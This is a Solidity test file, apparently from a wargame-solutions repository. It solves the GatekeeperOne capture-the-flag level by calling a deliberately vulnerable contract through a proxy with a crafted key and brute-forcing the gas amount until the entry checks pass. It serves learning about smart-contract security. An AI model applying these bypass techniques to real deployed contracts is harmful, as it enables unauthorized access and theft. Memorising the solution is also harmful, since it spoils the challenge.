// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import {LevelFactory} from "../utils/LevelFactory.sol";
import {GatekeeperOne} from "../../src/GatekeeperOne/Level.sol";

contract GateProxy {
    function enter(address _gate, bytes8 _gateKey) external {
	(bool entered,) = _gate.call(abi.encodeWithSignature("enter(bytes8)", _gateKey));
	require(entered, "nope...");
    }
}

interface GKO {
    function entrant() external view returns(address);
}

pragma solidity ^0.6.0;

contract GatekeeperOneTest is LevelFactory {
    address gatekeeperOne;

    function setUp() public {
	vm.prank(deployer); // deploy the contract as deployer
	gatekeeperOne = address(new GatekeeperOne());
    }

    function testAttack() public {
	submitLevel("GatekeeperOne");
    }

    function _performTest() internal override {
	address gateProxy = address(new GateProxy());
	emit log_named_address("origin", tx.origin);
	bytes8 key = 0x4141410000000065; // TODO: apply a mask the clean way!

	uint gasleft;

	for (uint i; i < 8191; i++) {
	    (bool worked,) = gateProxy.call.gas(i + 100000)(abi.encodeWithSignature("enter(address,bytes8)", gatekeeperOne, key));
	    if (worked) {
		gasleft = i;
		break;
	    }
	}
		
	emit log_named_uint("found gasleft", gasleft);
    }

    function _setupTest() internal override {
	super._setupTest();
    }

    function _checkTest() internal override returns (bool) {
	assertEq(GKO(gatekeeperOne).entrant(), attacker);

	return (GKO(gatekeeperOne).entrant() == attacker);
    }
}


